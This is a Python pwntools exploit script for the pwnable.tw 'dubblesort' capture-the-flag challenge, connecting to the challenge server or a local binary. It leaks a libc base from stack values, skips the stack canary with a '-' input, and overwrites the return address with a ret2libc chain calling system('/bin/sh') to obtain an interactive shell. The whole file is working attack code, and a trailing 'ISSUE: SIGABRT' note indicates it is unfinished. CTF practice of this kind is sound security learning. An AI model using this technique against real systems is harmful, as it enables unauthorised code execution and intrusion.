#!/usr/bin/env python3
from pwn import *

DWORD = 4
DUMMY = 0xdeadbeef

elf = ELF("./given/dubblesort")
libc = None

def conn():
    global libc
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10101)
        if libc is None:
            libc = ELF("./given/libc_32.so.6")
    else:
        p = process([elf.path])
        if libc is None:
            libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    return p

def leak_libc_base():
    global libc
    # info: pwndbg
    num_dword_to_ret = (0x7c + DWORD + DWORD) // DWORD

    p = conn()
    if args.LEAK_D:
        gdb.attach(p, "b *main + 319") # b4 canary check

    p.recvuntil(b"What your name :")
    p.send(b"\x00" * 0x40)

    n = num_dword_to_ret + 8
    print("number to solve", n)
    p.recvuntil(b"How many numbers do you what to sort :")
    p.sendline(str(n).encode())

    for i in range(n):
        msg = "Enter the {} number :".format(i).encode()
        p.recvuntil(msg)
        p.sendline(b"-")

    p.recvuntil(b"Result :\n", timeout=5)

    leaks = []
    for i in range(n):
        num = p.recvuntil(b" ")
        leaks.append(int(num.strip()))
    print([hex(addr) for addr in leaks])


    # objdump to find this
    main_ret_pattern = 0xf7000637 if args.REMOTE else 0xf7000519
    index = 0
    for i, addr in enumerate(leaks):
        if addr & 0xff000fff == main_ret_pattern:
            index = i
    main_ret = leaks[index]
    print("leak:", hex(main_ret))

    # objdump the libc to find where main returns
    # keyword: libc_start_main or libc_start_call_main
    if args.REMOTE:
        main_ret_offset = 0x18637
    else:
        # ubuntu 22.04
        libc_start_call_main_offset = 0x214a0
        main_ret_offset = libc_start_call_main_offset + 121
        # for some reasons, the __libc_start_call_main cannot be found in
        # the symbol table
    libc.address = main_ret - main_ret_offset
    print("[LEAK] Done", hex(libc.address))
    p.close()

def exploit():
    global libc
    p = conn()
    if args.D:
        gdb.attach(p, "b *main + 340")

    # info pwndbg
    num_dword_b4_canary = (0x7c - 0x1c) // DWORD
    num_dword_to_ret = (0x7c + DWORD + DWORD) // DWORD

    ropchain_dwords = [libc.symbols['system'],
                       libc.symbols['system'],
                       next(libc.search(b"/bin/sh"))]
    print([hex(n) for n in ropchain_dwords])
    assert(ropchain_dwords == sorted(ropchain_dwords))

    p.recvuntil(b"What your name :")
    p.send(b"\x00" * 0x40)

    n = num_dword_to_ret + len(ropchain_dwords) - 1
    print("number to solve", n)
    p.recvuntil(b"How many numbers do you what to sort :")
    p.sendline(str(n).encode())

    for i in range(n):
        msg = "Enter the {} number :".format(i).encode()
        p.recvuntil(msg)
        if i < num_dword_b4_canary:
            p.sendline(b"0")

        elif i == num_dword_b4_canary:
            p.sendline(b"-")
        elif i < num_dword_to_ret - 1:
            p.sendline(str(libc.address).encode())
        else:
            rop_index = i - num_dword_to_ret
            p.sendline(str(ropchain_dwords[rop_index]).encode())

    p.recvuntil(b"Result :\n", timeout=5)

    nums = []
    for i in range(n):
        num = p.recvuntil(b" ")
        nums.append(int(num.strip()))
    print([hex(n) for n in nums])

    final_msg = p.recvrepeat(5)
    print("final msg", final_msg.decode())
    if b"$" in final_msg:
        p.interactive()
    else:
        p.close()

if __name__ == '__main__':
    libc_base = leak_libc_base()
    while True:
        exploit()

    "ISSUE: SIGABRT"
